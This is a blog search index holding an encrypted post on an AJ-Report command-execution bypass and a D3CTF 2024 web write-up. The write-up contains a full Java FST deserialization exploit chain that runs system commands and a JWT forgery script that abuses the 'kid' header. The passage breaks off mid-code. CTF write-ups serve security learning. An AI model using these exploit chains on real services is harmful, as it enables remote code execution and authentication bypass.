<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AJ-REPORT 1.4.1未授权远程命令修复绕过</title>
      <link href="/2024/05/10/aj-report-yuan-cheng-ming-ling-zhi-xing-rao-guo/"/>
      <url>/2024/05/10/aj-report-yuan-cheng-ming-ling-zhi-xing-rao-guo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f2dde901900c39edf8e4efecdedf151d7a9a92e3eb07f3d4c2a00a50ea4e6423"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024 WEB</title>
      <link href="/2024/04/28/d3ctf2024/"/>
      <url>/2024/04/28/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h4 id="d3chain"><a href="#d3chain" class="headerlink" title="d3chain"></a>d3chain</h4><p>写完一看题没了，不过就是一个小签到。</p><p><code>FST</code>反序列化，没见过。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/backdoor"</span><span class="token punctuation">)</span><span class="token keyword">public</span> Object <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> String data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    FSTConfiguration conf <span class="token operator">=</span> FSTConfiguration<span class="token punctuation">.</span><span class="token function">createDefaultConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> conf<span class="token punctuation">.</span><span class="token function">asObject</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终定位到<code>instantiateAndReadWithSer</code>，调用反序列化器对应的<code>instantiate</code>进行反序列化。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319220103.png" alt="1714319220103"></p><p>不禁想到了<code>hessian</code>，这里果然有对应的反序列化器<code>FSTMapSerializer</code>，会调用<code>put</code>作为<code>start gadget</code>。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319274307.png" alt="1714319274307"></p><p>于是想到了通过<code>HashMap</code>比较<code>key</code>相同时会触发任意类的<code>equals</code>方法，那么通过<code>XString#equals</code>触发<code>POJONODE#toString</code>打<code>getter</code>就能<code>RCE</code>了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319461428.png" alt="1714319461428"></p><p><strong>exp:</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>d3<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ObjectIdGenerator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>XString<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>nustaq<span class="token punctuation">.</span>serialization<span class="token punctuation">.</span>FSTConfiguration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>nustaq<span class="token punctuation">.</span>serialization<span class="token punctuation">.</span>FSTObjectOutput<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        CtClass ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtMethod writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将修改后的CtClass加载至当前线程的上下文类加载器中</span>        ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span><span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> <span class="token function">xString2</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FSTObjectOutput fstObjectOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FSTObjectOutput</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        fstObjectOutput<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        fstObjectOutput<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String data <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>out<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        FSTConfiguration conf <span class="token operator">=</span> FSTConfiguration<span class="token punctuation">.</span><span class="token function">createDefaultConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conf<span class="token punctuation">.</span><span class="token function">asObject</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object template <span class="token operator">=</span> template <span class="token operator">=</span> <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object proxy <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//HashMap#readObject-->HotSwappableTargetSource#equals-->xString#equals-->node#toString</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">xString2</span><span class="token punctuation">(</span>Object node<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        XString xString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectIdGenerator<span class="token punctuation">.</span>IdKey idKey1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectIdGenerator<span class="token punctuation">.</span>IdKey</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>xString<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectIdGenerator<span class="token punctuation">.</span>IdKey idKey2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectIdGenerator<span class="token punctuation">.</span>IdKey</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>idKey1<span class="token punctuation">,</span><span class="token string">"hashCode"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>idKey1<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>idKey2<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>idKey2<span class="token punctuation">,</span><span class="token string">"hashCode"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> TemplatesImpl <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token keyword">throws</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"SOTA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//本机测试</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec("</span><span class="token operator">+</span>cmd<span class="token operator">+</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        System.out.println("java.lang.Runtime.getRuntime().exec("+cmd+");");</span>        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//补充实例化新建类所需的条件</span>        TemplatesImpl templates <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Squirtle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> templates<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj1<span class="token punctuation">,</span>String str<span class="token punctuation">,</span>Object obj2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        Field field2 <span class="token operator">=</span> obj1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取PriorityQueue的comparator字段</span>        field2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj1<span class="token punctuation">,</span> obj2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置queue的comparator字段值为comparator</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h4><p>第一步伪造<code>jwt</code>。</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"isadmin"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span>        key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token string">"frontend_key"</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>user_info<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"frontend_key"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>login_form<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span>kid<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">""</span>    dir <span class="token operator">=</span> <span class="token string">"/app/"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>dir<span class="token operator">+</span>kid<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">def</span> <span class="token function">verify_token</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> jwt<span class="token punctuation">.</span>get_unverified_header<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    kid <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string">"kid"</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>kid<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"HS256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是取<code>header</code>中的<code>kid</code>作为<code>header</code>作为<code>key</code>，<code>kid</code>可控所以读一个本地和远程内容相同的文件作为<code>key</code>就行了，客户端和服务端一致的就是<code>app.py</code>。</p><pre><code>headers = &#123;    &quot;kid&quot;: &quot;app.py&quot;&#125;kid = &quot;./app.py&quot;key = open(kid, &quot;r&quot;).read()user_info = &#123;&quot;username&quot;: &quot;admin&quot;, &quot;isadmin&quot;: True&#125;token = jwt.encode(user_info, key, algorithm=&quot;HS256&quot;, headers=&#123;&quot;kid&quot;: &quot;app.py&quot;&#125;)print(token)</code></pre><p>拿到<code>token</code>后就可以用<code>/admin</code>的转发功能了，这里要求<code>data</code>带<code>BackdoorPasswordOnlyForAdmin</code>。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token <span class="token operator">and</span> verify_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                forward_url <span class="token operator">=</span> <span class="token string">"python-backend:8080"</span>                conn <span class="token operator">=</span> http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">(</span>forward_url<span class="token punctuation">)</span>                method <span class="token operator">=</span> request<span class="token punctuation">.</span>method                headers <span class="token operator">=</span> <span class="token punctuation">{</span>key<span class="token punctuation">:</span> value <span class="token keyword">for</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>headers <span class="token 